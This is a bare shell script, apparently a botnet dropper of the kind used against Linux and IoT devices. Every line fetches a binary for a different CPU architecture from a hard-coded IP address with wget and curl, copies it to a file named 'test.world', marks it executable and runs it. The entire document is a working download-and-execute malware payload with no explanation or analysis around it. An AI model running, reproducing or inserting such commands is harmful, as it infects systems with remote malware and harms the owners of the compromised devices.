#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/x86; curl -O http://107.182.129.226/a/x86;cat x86 >test.world;chmod +x *;./test.world
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/mips; curl -O http://107.182.129.226/a/mips;cat mips >test.world;chmod +x *;./test.world
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/mpsl; curl -O http://107.182.129.226/a/mpsl;cat mpsl >test.world;chmod +x *;./test.world
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/arm4; curl -O http://107.182.129.226/a/arm4;cat arm4 >test.world;chmod +x *;./test.world
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/arm5; curl -O http://107.182.129.226/a/arm5;cat arm5 >test.world;chmod +x *;./test.world
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/arm6; curl -O http://107.182.129.226/a/arm6;cat arm6 >test.world;chmod +x *;./test.world
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/arm7; curl -O http://107.182.129.226/a/arm7;cat arm7 >test.world;chmod +x *;./test.world
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/ppc; curl -O http://107.182.129.226/a/ppc;cat ppc >test.world;chmod +x *;./test.world
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/m68k; curl -O http://107.182.129.226/a/m68k;cat m68k >test.world;chmod +x *;./test.world
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.129.226/a/sh4; curl -O http://107.182.129.226/a/sh4;cat sh4 >test.world;chmod +x *;./test.world
